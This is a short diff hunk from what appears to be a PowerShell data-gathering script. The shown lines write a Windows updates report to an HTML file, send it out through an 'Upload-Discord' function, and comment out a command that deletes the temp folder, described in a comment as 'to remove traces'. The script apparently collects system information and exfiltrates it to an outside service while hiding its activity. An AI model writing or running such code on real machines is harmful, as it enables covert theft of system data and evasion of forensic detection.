@@ -28,7 +28,7 @@ $Report | Out-File -FilePath "$userDir\WinUpdates.html" -Encoding utf8
 
 Upload-Discord -file "C:\temp\WinUpdates.html" -text "Updates Informations :"
 #Removing every file to remove traces
-rmdir -R \temp
+#rmdir -R \temp
 }
 function SysInfo {
 #Making sure that my path is on C:\ and creating a \temp folder, then go inside that folder to execute everything
